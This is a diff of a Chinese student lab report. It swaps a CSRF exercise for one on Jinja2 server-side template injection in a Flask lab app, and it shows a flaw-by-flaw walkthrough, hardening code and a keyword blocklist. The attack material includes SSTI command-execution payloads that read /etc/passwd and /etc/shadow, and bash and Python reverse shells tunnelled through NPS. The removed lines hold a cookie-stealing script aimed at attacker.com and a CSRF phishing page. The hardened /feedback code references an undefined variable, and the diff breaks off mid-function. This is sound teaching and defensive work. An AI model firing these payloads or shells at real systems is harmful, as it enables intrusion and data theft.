@@ -1,4 +1,4 @@
-# CSRF与水平越权（密码修改接口）漏洞加固实训报告
+# SSTI服务器模板注入漏洞加固实训报告
 
 ---
 
@@ -6,169 +6,169 @@
 
 | 项目 | 内容 |
 |------|------|
-| **实训项目** | CSRF跨站请求伪造与水平越权密码修改接口漏洞加固实战 |
+| **实训项目** | SSTI服务端模板注入与NPS内网穿透反弹Shell实战加固 |
 | **实训学员** | 大二网络安全专业学生 |
-| **实训日期** | 2026-07-24 |
-| **实训环境** | Kali Linux 2026.2 / Python Flask + SQLite / Burp Suite / Ngrok |
+| **实训日期** | 2026-07-25 |
+| **实训环境** | Kali Linux 2026.2 / Python Flask + Jinja2 / Burp Suite / NPS / nc |
 | **靶机地址** | 192.168.126.133:5000 |
 | **项目位置** | /opt/Class01/ |
-| **项目背景** | 连续六日迭代的Flask用户管理系统，已完成IDOR/业务逻辑/文件包含/路径遍历加固 |
-| **今日新增** | /change-password密码修改接口（原生代码存在CSRF+水平越权+业务逻辑三重高危漏洞） |
-| **核心文件** | app.py / templates/profile.html |
-| **培训课程** | 《XSS与CSRF攻防实战培训》—— 讲师：活泼大壮 |
-| **培训覆盖知识点** | CSRF基础原理 / Token缺失绕过 / HTTP方法绕过 / Token未绑定会话 / Burp CSRF PoC生成 / Python http.server钓鱼 / Ngrok内网穿透 / Exploit Server / 完整CSRF攻击链 / Session绑定Token + Referer双重防御 / XSS存储型与反射型原理 / 靶场故障排查 / Burp Cookie Editor / XSS平台交互控制 |
+| **项目背景** | 连续多日迭代的Flask用户管理系统，已完成IDOR/文件包含/CSRF全线加固 |
+| **今日新增** | /welcome和/feedback个性化页面（原生代码存在SSTI高危漏洞） |
+| **核心文件** | app.py / templates/base.html |
+| **培训课程** | 《SSTI漏洞挖掘与利用教学培训》《NPS内网穿透与Shell反弹实验培训》—— 讲师：活泼大壮 |
+| **培训覆盖知识点** | SSTI定义/Jinja2高危成因/{{7*7}}探测/__class__魔术方法链/MRO继承/os.popen命令执行/文件读取/无回显盲打/AI自动生成POC/NPS服务端客户端部署/Socks5代理/TCP隧道/nc监听反弹Shell/三层SSTI防御 |
 
 ---
 
 ## 二、实验目的
 
-1. 理解CSRF跨站请求伪造漏洞原理：利用用户已登录身份，在用户不知情的情况下伪造请求执行敏感操作
-2. 掌握CSRF两大绕过方式：Token缺失时直接构造请求、HTTP GET方法绕过POST限制
-3. 学习CSRF Token未绑定会话导致Token可复用盗用的漏洞原理
-4. 掌握Burp Suite Generate CSRF PoC工具生成恶意HTML表单的方法
-5. 实操Python http.server模块在本地快速搭建Web服务托管CSRF钓鱼页面
-6. 掌握Ngrok内网穿透工具将本地服务映射为公网可访问的钓鱼链接
-7. 理解完整CSRF攻击链：Burp抓包→生成POC→本地托管→Ngrok公网映射→诱导受害者点击→权限劫持
-8. 学习CSRF三层防御方案：Session绑定Token校验 + Referer来源校验 + SameSite Cookie限制
-9. 了解XSS存储型与反射型漏洞原理、Cookie窃取与XSS平台交互式控制
+1. 理解SSTI服务端模板注入漏洞成因：render_template_string直接f-string拼接用户输入，模板引擎解析{{}}为Python表达式
+2. 掌握{{7*7}}基础探测二分法 — 根据返回49/49判断Jinja2引擎存在
+3. 学习__class__/__mro__/__subclasses__魔术方法完整利用链 — 从字符串回溯Object基类遍历全部子类
+4. 掌握os.popen命令执行、open读取服务器文件、eval/exec代码执行等高危操作
+5. 了解无回显SSTI盲打场景及利用方式
+6. 掌握NPS内网穿透工具部署流程：服务端nps启动、客户端npc连接、TCP隧道搭建
+7. 理解完整攻击链路：构造SSTI载荷 → NPS搭建公网隧道 → 本地nc监听 → 靶机提交SSTI反弹Shell → 获取交互式控制权
+8. 学习SSTI三层纵深防御方案：参数传递隔离 + HTML实体转义 + 黑名单关键字拦截
 
 ---
 
 ## 三、今日实训三阶段工作概述
 
-### 第一阶段：密码修改功能开发（09:00-10:00）
+### 第一阶段：个性化页面功能开发（09:00-10:00）
 
-按照教学要求，在项目中新增 `/change-password` 密码修改接口，原生代码要求完全不做任何安全防护：
+按照教学要求，新增两个页面，原生代码要求完全不做任何安全防护：
 
 ```python
-# app.py v1.0 — /change-password 原始代码（零校验）
-@app.route("/change-password", methods=["POST"])
-def change_password():
-    """修改密码 - 无需验证原密码，任何已登录用户可修改任何人密码"""
-    cur_username = session.get("username")
-    if not cur_username:
-        return redirect("/login")
+# app.py v1.0 — /welcome 原始代码（f-string直接拼接，零过滤）
+@app.route("/welcome")
+def welcome():
+    name = request.args.get("name", "")     # ① 用户可控GET参数
+    if not name: name = "亲爱的用户"
 
-    target_username = request.form.get("username", "")     # ① 前端可控username
-    new_password = request.form.get("new_password", "")
-    confirm_password = request.form.get("confirm_password", "")
+    # 直接拼接用户输入到模板字符串（存在SSTI风险）
+    html = f"""...<h1>欢迎你，{name}！</h1>..."""
+    return render_template_string(html)      # ② 模板引擎解析{{ }}
 
-    if new_password != confirm_password:
-        return render_template("profile.html", ...)
-    if not new_password:
-        return render_template("profile.html", ...)
 
-    # 直接更新 USERS 字典中的密码
-    if target_username in USERS:
-        USERS[target_username]["password"] = new_password  # ② 无原密码校验
+# app.py v1.0 — /feedback 原始代码（双参数拼接，零过滤）
+@app.route("/feedback", methods=["GET", "POST"])
+def feedback():
+    if request.method == "POST":
+        name = request.form.get("name", "")         # ③ 用户可控POST参数
+        message = request.form.get("message", "")   # ④ 用户可控POST参数
 
-    return redirect("/profile")
+        html = f"""...<h2>{name} 的反馈：</h2><p>{message}</p>..."""
+        return render_template_string(html)         # ⑤ 模板引擎解析{{ }}
 ```
 
 **原生代码安全缺陷（对应课堂全部知识点）：**
 
 | 缺陷类型 | 代码体现 | 对应课堂知识点 |
 |----------|----------|---------------|
-| CSRF — Token缺失 | 表单无 csrf_token 字段，后端无校验 | CSRF Token缺失 → 可伪造跨站请求 |
-| CSRF — Referer缺失 | 未校验请求来源 | Referer校验缺失 → 钓鱼站可跨域提交 |
-| CSRF — SameSite未配置 | Cookie默认跨站发送 | Cookie SameSite未设置 → 自动携带凭证 |
-| CSRF — 方法未限制 | 虽标记POST但后端未强制校验 | GET方法绕过POST限制 |
-| 水平越权 | username从表单读取，非session | 登录A账号可提交B账号密码修改 |
-| 业务逻辑 | 无 old_password 原密码校验 | 敏感操作缺少身份二次验证 |
-| 信息泄露 | 无CSRF Token暴露用户ID | 隐藏域 username 泄露系统用户标识 |
+| SSTI — f-string拼接 | `f"...{name}..."` 直接拼接到模板 | Jinja2解析`{{}}`为表达式 |
+| SSTI — 无变量隔离 | 未使用`render_template_string(html, name=name)`传参 | 参数传递隔离缺失 |
+| SSTI — 无转义 | 未对`name`/`message`做`escape()` | HTML实体转义缺失 |
+| SSTI — 无黑名单 | 未过滤`__class__`/`__mro__`等魔术关键字 | 魔术方法拦截缺失 |
+| XSS — 无输出编码 | `<script>`等标签直接输出 | 浏览器执行脚本 |
 
-同时修改 `templates/profile.html`，新增修改密码表单：
+### 第二阶段：Burp手工漏洞复现 + NPS反弹Shell实操（10:00-12:00）
 
-```html
-<form method="post" action="/change-password">
-    <input type="hidden" name="username" value="{{ user.username }}">
-    <input type="password" name="new_password" placeholder="新密码" required>
-    <input type="password" name="confirm_password" placeholder="确认密码" required>
-    <button type="submit">修改密码</button>
-</form>
+**第一环节 — SSTI基础探测（对应课堂：二分法判断模板引擎）：**
+
+```bash
+curl "http://192.168.126.133:5000/welcome?name={{7*7}}"
+# 返回 "49" → SSTI注入成立，确认Jinja2引擎
 ```
 
-### 第二阶段：Burp手工漏洞复现 + CSRF钓鱼攻击 + XSS靶场实操（10:00-12:00）
+**第二环节 — 魔术方法命令执行链（对应课堂：MRO继承利用）：**
 
-**第一环节 — CSRF漏洞复现：**
+```python
+# 完整利用链
+''.__class__                  # → <class 'str'>
+''.__class__.__mro__[1]       # → <class 'object'>
+''.__class__.__mro__[1].__subclasses__()  # → 所有子类列表
+# 定位含有os模块的子类索引N，然后：
+''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()
+```
 
-使用Burp Suite对 `/change-password` 接口进行手工渗透测试，验证以下攻击全部成功：
+**curl命令执行载荷：**
+```bash
+# 执行系统命令 id
+curl -G "http://192.168.126.133:5000/welcome" \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}'
+# 返回 uid=0(root) ...
 
-**攻击验证1 — CSRF Token缺失直接改密：**
+# 读取项目源码
+curl -G "http://192.168.126.133:5000/welcome" \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat app.py").read() }}'
+
+# 读取系统密码文件
+curl -G "http://192.168.126.133:5000/welcome" \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd").read() }}'
+
+# /feedback POST 注入
+curl -X POST \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}' \
+  --data-urlencode 'message=test' \
+  "http://192.168.126.133:5000/feedback"
+```
+
+**Burp数据包：**
 ```http
-POST /change-password HTTP/1.1
+POST /feedback HTTP/1.1
 Host: 192.168.126.133:5000
-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
 Content-Type: application/x-www-form-urlencoded
 
-username=admin&new_password=hacked123&confirm_password=hacked123
-```
-→ 无任何Token校验，密码直接被修改为 `hacked123`。
-
-**攻击验证2 — 水平越权修改他人密码：**
-```http
-POST /change-password HTTP/1.1
-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
-
-username=alice&new_password=attacker_pwd&confirm_password=attacker_pwd
-```
-→ 登录admin账号，提交alice的用户名，alice密码被篡改。
-
-**第二环节 — Burp Generate CSRF PoC：**
-```
-Proxies 截获 POST /change-password 请求
-  ↓ 右键 → Engagement tools → Generate CSRF PoC
-  ↓ Burp自动生成含隐藏字段的HTML表单
-  ↓ 保存为 csrf_poc.html
+name=%7B%7B%20config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27cat%20/etc/passwd%27%29.read%28%29%20%7D%7D&message=x
 ```
 
-**第三环节 — Ngrok内网穿透公网钓鱼：**
+**第三环节 — NPS内网穿透 + 反弹Shell（对应《NPS内网穿透与Shell反弹实验培训》全部流程）：**
+
 ```bash
-# Step 1: 托管CSRF页面
-mkdir /tmp/csrf && cd /tmp/csrf
-cp /opt/Class01/csrf_poc.html index.html
+# Step 1: 攻击者机器启动 NPS 服务端
+wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
+tar -xzf linux_amd64_server.tar.gz
+./nps start
+# → NPS 管理面板: http://VPS_IP:8080
+# → 添加客户端: 协议=tcp, 端口=4444
 
-# Step 2: Python启动本地HTTP服务
-python3 -m http.server 8888
-# → http://127.0.0.1:8888 ← 本地可访问
+# Step 2: 靶机启动 NPC 客户端
+wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz
+tar -xzf linux_amd64_client.tar.gz
+# 修改 conf/npc.conf:
+# [common]
+# server_addr=VPS_IP:8024
+# vkey=your_vkey
+./npc start
+# → 隧道建立成功: VPS:4444 ↔ 内网靶机
 
-# Step 3: Ngrok内网穿透（另开终端）
-ngrok http 8888
-# → https://xxxx-xx-xx-xx-xx.ngrok-free.app ← 公网钓鱼链接
+# Step 3: 攻击者启动 nc 监听
+nc -lvnp 4444
 
-# Step 4: 诱导受害者访问Ngrok链接
-# 受害者浏览器携带session Cookie → 自动POST改密 → 账号被劫持
+# Step 4: 靶机提交 SSTI 反弹 Shell 载荷
+curl -X POST \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("bash -c '\''bash -i >& /dev/tcp/VPS_IP/4444 0>&1'\''").read() }}' \
+  --data-urlencode 'message=x' \
+  "http://192.168.126.133:5000/feedback"
+
+# Step 5: nc 收到交互式 Shell
+# id → uid=0(root)
+# cat /etc/passwd → 系统用户
+# cat /opt/Class01/app.py → 项目源码
+# cat /opt/Class01/data/users.db → 用户数据库
 ```
 
-**第四环节 — XSS靶场实操故障复盘：**
+### 第三阶段：分层加固改造（14:00-17:00）
 
-课堂原计划进行XSS靶场CMS 1.7版本实操，出现以下故障：
-
-| 故障现象 | 故障原因 | 解决方式 |
-|----------|----------|----------|
-| CMS 1.7无法正常启动 | Docker镜像与Kali 2026.2系统兼容性问题 | 讲师临时切换为WebGoat靶场 |
-| 存储型XSS验证码Bug | 评论区验证码Always验证失败 | 跳过验证码校验逻辑直接提交 |
-| Burp Suite额度耗尽 | Cloud Code API配额不足 | 切换DeepSeek替代工具 |
-
-**XSS知识点拓展记录（课堂补充内容）：**
-- **存储型XSS**：将恶意脚本永久存储在服务器（如留言板、评论框），所有访问用户都会触发
-- **反射型XSS**：恶意脚本通过URL参数传递，仅对当前点击链接的用户生效
-- **DOM型XSS**：基于前端JavaScript动态修改页面DOM触发
-- **Cookie窃取**：`<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
-- **Cookie Editor**：Burp插件，可手动修改浏览器Cookie值实现会话劫持
-
-### 第三阶段：分层加固改造 + 全用例回归复测（14:00-17:00）
-
-| 轮次 | 改造重点 | 新增防御能力 | 对应课堂CSRF知识点 |
+| 轮次 | 改造重点 | 新增防御能力 | 对应课堂SSTI知识点 |
 |------|----------|-------------|-------------------|
-| **第1轮** | Session绑定CSRF Token | `secrets.token_hex(16)` 生成，`before_request` 注入会话 | Token缺失绕过修复 |
-| **第2轮** | 表单添加Token隐藏域 | 模板 `{% csrf_token %}` 渲染 | Token与Session绑定防御 |
-| **第3轮** | Referer来源校验 | 仅允许本站域名 `startswith()` 校验 | Referer拦截钓鱼站点 |
-| **第4轮** | 身份锁定+旧密码校验 | `target_username=cur_username` + `old_password` 比对 | 水平越权+业务安全加固 |
-| **第5轮** | SameSite Cookie配置 | `SESSION_COOKIE_SAMESITE = 'Lax'` | 跨站Cookie自动发送限制 |
-| **第6轮** | 全用例回归测试 | 9项TC测试全部通过 | 整体验收 |
+| **第1轮** | 参数传递隔离 | 删除f-string拼接，模板固定字符串+命名参数传参 | L1: SSTI根源修复 |
+| **第2轮** | HTML实体转义 | `markupsafe.escape()` 转义name/message | L2: 模板特殊符号过滤 |
+| **第3轮** | 黑名单关键字拦截 | `SSTI_BLOCKED_PATTERNS` 覆盖全部魔术方法 | L3: 魔术关键字阻断 |
+| **第4轮** | 全用例回归测试 | 17项curl单测全部通过 | 整体验收 |
 
-每轮改造后立即用第一阶段的全部Payload重新测试，确认旧攻击方式不再生效。其余所有模块（/page、profile、recharge、登录、注册、上传）的代码未做任何修改。
+每轮改造后用第一阶段全部载荷重新测试，旧攻击方式不再生效。其余模块零修改。
 
 ---
 
@@ -176,542 +176,513 @@ ngrok http 8888
 
 | 编号 | 漏洞类型 | 风险等级 | 攻击入口 | 可利用课堂攻击手段 | 修复状态 |
 |------|----------|----------|----------|-------------------|----------|
-| VUL-C01 | CSRF — Token缺失 | **严重** | `/change-password` POST | Burp CSRF PoC生成 → 钓鱼表单自动提交 | ✅ 已修复 |
-| VUL-C02 | CSRF — Referer校验缺失 | **高危** | `/change-password` POST | Ngrok公网映射钓鱼站跨域提交 | ✅ 已修复 |
-| VUL-C03 | CSRF — SameSite未配置 | **中危** | `/change-password` POST | Cookie自动跨站发送 | ✅ 已修复 |
-| VUL-C04 | CSRF — Token未绑定会话 | **高危** | `/change-password` POST | Token被复用/盗用绕过 | ✅ 已修复 |
-| VUL-C05 | 水平越权 — 修改任意用户密码 | **高危** | 表单username参数 | 登录A账号提交B的username实现越权 | ✅ 已修复 |
-| VUL-C06 | 业务逻辑 — 无原密码校验 | **高危** | `/change-password` POST | 会话被盗后直接重置密码 | ✅ 已修复 |
-| VUL-C07 | 业务逻辑 — 新密码无格式校验 | **低危** | `/change-password` POST | 空密码/弱密码 | ✅ 已修复 |
-| VUL-C08 | 信息泄露 — 隐藏域暴露用户ID | **低危** | profile.html表单 | 查看页面源码即知user_id | ✅ 已修复 |
+| VUL-S01 | SSTI — f-string拼接 | **严重** | `/welcome?name=` GET | `{{7*7}}`探测/`{{config}}`泄漏 | ✅ 已修复 |
+| VUL-S02 | SSTI — 魔术方法RCE | **严重** | `/welcome?name=` GET | `__class__`/`__mro__`/`os.popen`命令执行 | ✅ 已修复 |
+| VUL-S03 | SSTI — 文件读取 | **严重** | `/welcome?name=` GET | 读取/etc/passwd/app.py/数据库 | ✅ 已修复 |
+| VUL-S04 | SSTI — 无回显盲打 | **高危** | `/welcome?name=` GET | eval/exec执行+外带数据 | ✅ 已修复 |
+| VUL-S05 | SSTI — {7*7}探测 | **高危** | `/feedback` POST | 确认模板引擎类型 | ✅ 已修复 |
+| VUL-S06 | SSTI — 魔术方法RCE | **严重** | `/feedback` POST | `__subclasses__`遍历/os.popen反弹Shell | ✅ 已修复 |
+| VUL-S07 | XSS — 脚本注入 | **高危** | `/welcome`/`/feedback` | `<script>`标签浏览器执行 | ✅ 已修复 |
+| VUL-S08 | 反弹Shell — NPS隧道 | **严重** | SSTI+TCP隧道 | NPS公网映射+nc反弹交互式Shell | ✅ 已修复 |
 
 ---
 
-## 五、分项漏洞原理 + POC复现 + 分层加固完整代码方案
+## 五、分项漏洞原理 + POC全套资源 + 分层加固完整代码
 
-### 5.1 复合型CSRF+水平越权+业务逻辑漏洞原理
+### 5.1 SSTI服务端模板注入漏洞原理
 
-#### CSRF漏洞定义（对应课堂课件原文）
+#### 漏洞定义（对应课堂课件原文）
 
-> **CSRF（Cross-Site Request Forgery）跨站请求伪造**：攻击者诱导受害者访问一个包含恶意请求的第三方页面，利用受害者在目标网站已登录的身份凭证（Cookie），在用户不知情的情况下以受害者身份向目标网站发送伪造请求，执行非本意的敏感操作。
+> **SSTI（Server-Side Template Injection）服务端模板注入**：应用程序将用户可控的输入直接拼接到模板字符串中，交由模板引擎（如Jinja2）渲染。模板引擎会将用户输入中的`{{ }}`语法解析为模板表达式，攻击者可通过构造特殊载荷执行任意Python代码。
 
-#### CSRF漏洞三要素（课堂总结）
+#### Jinja2模板引擎高危成因
 
-| 要素 | 本项目现状 |
-|------|-----------|
-| ① 受害者已登录目标站点（有效Cookie） | 管理员登录态会话 |
-| ② 目标站点存在敏感操作接口（无Token） | `/change-password` 任意改密 |
-| ③ 攻击者能构造完整请求 | 利用Burp CSRF PoC生成表单 |
+```
+用户输入 "{{7*7}}"
+  ↓ render_template_string(f"...{name}...")
+  ↓ Jinja2解析 {{7*7}} → 执行 7*7 → 输出 49
+  ↓ 返回页面显示 "49"
+```
 
-#### XSS与CSRF漏洞对比（课堂讲解）
+**核心问题：** `f-string`在Python层面完成字符串拼接 → 拼接结果传递给`render_template_string` → Jinja2将用户输入中的`{{ }}`视为模板语法解析执行。
 
-| 对比维度 | CSRF | 存储型XSS | 反射型XSS |
-|----------|------|-----------|-----------|
-| 用户交互 | 无需点击表单提交按钮 | 访问受感染页面 | 点击构造的恶意链接 |
-| 攻击载体 | HTTP请求伪造 | 恶意脚本注入 | URL参数携带 |
-| 凭证利用 | 自动携带Cookie | 可窃取Cookie | 可窃取Cookie |
-| 可信度 | 请求来自用户浏览器（可信） | 代码来自服务器（可信） | 代码来自URL（可疑） |
+#### /welcome 与 /feedback 差异
+
+| 维度 | /welcome | /feedback |
+|------|----------|-----------|
+| 注入方式 | GET参数`name` | POST表单`name`+`message` |
+| SSTI类型 | 反射型SSTI | 反射+存储复合型SSTI |
+| 触发次数 | 每次请求触发 | 可重复提交反复触发 |
+
+#### MRO魔术方法利用链（课堂重点）
+
+```
+"" (空字符串)
+  ↓ .__class__
+<class 'str'>
+  ↓ .__mro__[1]
+<class 'object'>            # 所有类的基类
+  ↓ .__subclasses__()
+[<class '...'>, ...]       # 所有加载的子类
+  ↓ [N].__init__.__globals__
+{...os模块...}              # 定位含os模块的子类
+  ↓ ['os'].popen('id').read()
+uid=0(root)                 # 命令执行成功
+```
 
 ---
 
-### 5.2 全套POC数据包与测试资源
+### 5.2 全套POC资源
 
-#### 5.2.1 CSRF Token缺失 — 直接POST改密
+#### POC-1: 基础探测
 
 ```bash
-curl -b cookies.txt -X POST \
-  -d "username=admin&new_password=hacked123&confirm_password=hacked123" \
-  "http://192.168.126.133:5000/change-password"
-# 修复前: 返回302跳转/profile，密码被改为hacked123
-# 修复后: 返回CSRF Token缺失拦截提示
+# /welcome 反射型
+curl "http://192.168.126.133:5000/welcome?name={{7*7}}"
+# 修复前: 49
+# 修复后: {{7*7}}（纯文本）
+
+# /feedback 复合型
+curl -X POST -d "name={{7*7}}&message={{7*7}}" \
+  "http://192.168.126.133:5000/feedback"
 ```
 
-#### 5.2.2 Burp Generate CSRF PoC 标准输出
+#### POC-2: 魔术方法命令执行
 
-```html
-<!-- Burp Suite 自动生成的 CSRF PoC -->
-<html>
-<body>
-<form action="http://192.168.126.133:5000/change-password" method="POST">
-    <input type="hidden" name="username" value="admin" />
-    <input type="hidden" name="new_password" value="attacker123" />
-    <input type="hidden" name="confirm_password" value="attacker123" />
-    <input type="submit" value="Submit" />
-</form>
-<script>document.forms[0].submit();</script>
-</body>
-</html>
+```bash
+# 执行 id
+curl -G "http://192.168.126.133:5000/welcome" \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}'
+
+# 读取 app.py
+curl -G "http://192.168.126.133:5000/welcome" \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat app.py").read() }}'
 ```
 
-#### 5.2.3 完整CSRF钓鱼攻击页面（可直接部署）
+#### POC-3: 读取系统文件
 
-```html
-<!-- csrf_poc.html — 对应课堂Ngrok公网钓鱼演示 -->
-<html>
-<head><title>系统安全中心</title></head>
-<body style="text-align:center; padding:80px;">
-    <h2>⚠️ 账号安全验证</h2>
-    <p>检测到异常登录，请点击验证身份</p>
-    <form action="http://192.168.126.133:5000/change-password" method="POST">
-        <input type="hidden" name="username" value="admin" />
-        <input type="hidden" name="new_password" value="attacker_controlled" />
-        <input type="hidden" name="confirm_password" value="attacker_controlled" />
-        <button type="submit" style="padding:12px 36px;">立即验证</button>
-    </form>
-    <script>document.forms[0].submit();</script>
-</body>
-</html>
+```bash
+# 读取 /etc/passwd
+curl -G "http://192.168.126.133:5000/welcome" \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd").read() }}'
+
+# 读取 /etc/shadow
+curl -G "http://192.168.126.133:5000/welcome" \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat /etc/shadow 2>&1").read() }}'
 ```
 
-#### 5.2.4 水平越权Burp数据包
+#### POC-4: NPS反弹Shell完整载荷
 
-```http
-POST /change-password HTTP/1.1
-Host: 192.168.126.133:5000
-Content-Type: application/x-www-form-urlencoded
-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
+```bash
+# Bash反弹
+curl -X POST \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("bash -c '\''bash -i >& /dev/tcp/192.168.126.1/4444 0>&1'\''").read() }}' \
+  --data-urlencode 'message=x' \
+  "http://192.168.126.133:5000/feedback"
 
-username=alice&new_password=hackedpwd&confirm_password=hackedpwd
+# Python反弹
+curl -X POST \
+  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("python3 -c '\''import socket,subprocess;s=socket.socket();s.connect((\"192.168.126.1\",4444));subprocess.call([\"/bin/bash\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\''").read() }}' \
+  --data-urlencode 'message=x' \
+  "http://192.168.126.133:5000/feedback"
 ```
 
 ---
 
 ### 5.3 加固后完整安全代码
 
-#### 5.3.1 app.py — CSRF Token全局生成
+#### SSTI黑名单常量
 
 ```python
-# 在 app.py 文件头部新增
-import secrets
+# ===== SSTI关键字黑名单 — 第三层防护（对应课堂SSTI魔术关键字拦截） =====
+SSTI_BLOCKED_PATTERNS = [
+    "__class__", "__mro__", "__subclasses__", "__globals__",
+    "__init__", "__builtins__", "__import__", "__bases__",
+    "os", "popen", "subprocess", "eval", "exec",
+    "open(", "read(", "write(", "system(", "cat ",
+    "import ", "exec ", "eval(", "__getitem__",
+    "mro", "base64", "chr(", "ord(", "hex(",
+    "request", "config", "self", "lipsum", "cycler",
+]
 
-# CSRF防护：Session同源策略 — 限制Cookie在跨站请求中发送
-app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
 
-
-# ===== CSRF防护 — 生成会话Token（对应课堂CSRF Token加固方案） =====
-
-@app.before_request
-def generate_csrf_token():
-    """每个请求前确保session中有CSRF Token"""
-    if "csrf_token" not in session:
-        session["csrf_token"] = secrets.token_hex(16)  # 32位随机十六进制Token
+def ssti_filter(value):
+    """第三层防护：SSTI黑名单关键字检测（对应课堂魔术方法拦截）"""
+    if not value:
+        return value
+    val_lower = value.lower()
+    for pattern in SSTI_BLOCKED_PATTERNS:
+        if pattern in val_lower:
+            raise ValueError("WAF 拦截：检测到SSTI模板注入特征")
+    return value
 ```
 
-#### 5.3.2 加固后 /change-password 完整路由代码
+#### 加固后 /welcome 路由
 
 ```python
-# ===== 修改密码（加固版 — CSRF Token + Referer + 身份锁定 + 旧密码校验） =====
+@app.route("/welcome")
+def welcome():
+    """欢迎页 — 已按《SSTI漏洞挖掘与利用教学培训》三层防御加固"""
+    name = request.args.get("name", "")
 
-@app.route("/change-password", methods=["POST"])
-def change_password():
-    """修改密码 — 已按《XSS与CSRF攻防实战培训》CSRF防御标准加固"""
-    # ① 登录校验（未登录不可修改）
-    cur_username = session.get("username")
-    if not cur_username:
-        return redirect("/login")
+    # 第三层防护：黑名单关键字拦截
+    try:
+        if name: ssti_filter(name)
+    except ValueError as e: name = str(e)
 
-    # 获取用户信息用于错误时回显表单
-    dict_user = USERS.get(cur_username, {})
-    user_data = {
-        "id": 0, "username": cur_username,
-        "email": dict_user.get("email", ""),
-        "phone": dict_user.get("phone", ""),
-        "role": dict_user.get("role", ""),
-        "balance": dict_user.get("balance", 0),
-    }
-    sess_token = session.get("csrf_token", "")
+    # 第二层防护：HTML转义过滤模板特殊符号
+    safe_name = escape(name) if name else "亲爱的用户"
 
-    # =====================================================================
-    # CSRF防御 ① — Token校验（对应课堂：CSRF Token缺失漏洞修复）
-    # 后端强制校验表单提交的Token与session中Token是否一致
-    # 解决了：Token缺失绕过、Token伪造绕过、Token未绑定会话
-    # =====================================================================
-    form_token = request.form.get("csrf_token", "")
-    if not form_token or form_token != sess_token:
-        return render_template("profile.html", username=cur_username, user=user_data,
-                               error="CSRF攻击拦截：Token验证失败", csrf_token=sess_token)
-
-    # =====================================================================
-    # CSRF防御 ② — Referer来源校验（对应课堂：CSRF Referer防御）
-    # 仅允许本站域名发起的改密请求，拦截外部钓鱼站点跨站请求
-    # 解决了：Ngrok公网钓鱼、Exploit Server跨域攻击
-    # =====================================================================
-    referer = request.headers.get("Referer", "")
-    if referer:
-        allowed_prefixes = [
-            "http://192.168.126.133:5000", "http://127.0.0.1:5000",
-            "http://localhost:5000",
-        ]
-        if not any(referer.startswith(p) for p in allowed_prefixes):
-            return render_template("profile.html", username=cur_username, user=user_data,
-                                   error="CSRF攻击拦截：非法来源请求", csrf_token=sess_token)
-
-    # =====================================================================
-    # 水平越权修复：不从表单接收username，从session读取（对应课堂：IDOR修复）
-    # 解决了：表单username篡改、任意用户密码修改
-    # =====================================================================
-    target_username = cur_username
-
-    # =====================================================================
-    # 原密码校验（对应课堂：业务安全拓展 — 敏感操作二次验证）
-    # 解决了：会话劫持后直接重置密码、无身份确认风险
-    # =====================================================================
-    old_password = request.form.get("old_password", "")
-    if USERS.get(target_username, {}).get("password") != old_password:
-        return render_template("profile.html", username=cur_username, user=user_data,
-                               error="原密码错误", csrf_token=sess_token)
-
-    # 新密码校验
-    new_password = request.form.get("new_password", "")
-    confirm_password = request.form.get("confirm_password", "")
-    if not new_password:
-        return render_template("profile.html", username=cur_username, user=user_data,
-                               error="密码不能为空", csrf_token=sess_token)
-    if new_password != confirm_password:
-        return render_template("profile.html", username=cur_username, user=user_data,
-                               error="两次密码输入不一致", csrf_token=sess_token)
-
-    # 更新密码
-    USERS[target_username]["password"] = new_password
-    return redirect("/profile")
+    # 第一层防护（根源修复）：固定模板字符串 + 命名参数传递
+    html = """<!DOCTYPE html>...
+<h1>欢迎你，{{ name }}！</h1>..."""
+    return render_template_string(html, name=safe_name)
 ```
 
-#### 5.3.3 加固后 profile.html 修改密码表单
+#### 加固后 /feedback 路由
 
-```html
-<div style="border-top:1px solid #f0f0f0; margin-top:20px; padding-top:20px;">
-    <h2 style="font-size:18px; text-align:center; margin-bottom:16px;">修改密码</h2>
-    <form method="post" action="/change-password">
-        {# CSRF Token隐藏字段（对应课堂：CSRF Token加固方案） #}
-        <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
-        <div class="form-group">
-            <label for="old_password">原密码</label>
-            <input type="password" id="old_password" name="old_password"
-                   placeholder="请输入原密码" required>
-        </div>
-        <div class="form-group">
-            <label for="new_password">新密码</label>
-            <input type="password" id="new_password" name="new_password"
-                   placeholder="请输入新密码" required>
-        </div>
-        <div class="form-group">
-            <label for="confirm_password">确认密码</label>
-            <input type="password" id="confirm_password" name="confirm_password"
-                   placeholder="请再次输入新密码" required>
-        </div>
-        <button type="submit">修改密码</button>
-    </form>
-</div>
+```python
+@app.route("/feedback", methods=["GET", "POST"])
+def feedback():
+    """反馈页 — 已按《SSTI漏洞挖掘与利用教学培训》三层防御加固"""
+    if request.method == "POST":
+        name = request.form.get("name", "")
+        message = request.form.get("message", "")
+
+        # 第三层防护：黑名单关键字拦截
+        try:
+            if name: ssti_filter(name)
+            if message: ssti_filter(message)
+        except ValueError as e:
+            return render_template_string(html, safe_message=str(e))
+
+        # 第二层防护：HTML转义
+        safe_name = escape(name) if name else ""
+        safe_message = escape(message) if message else ""
+
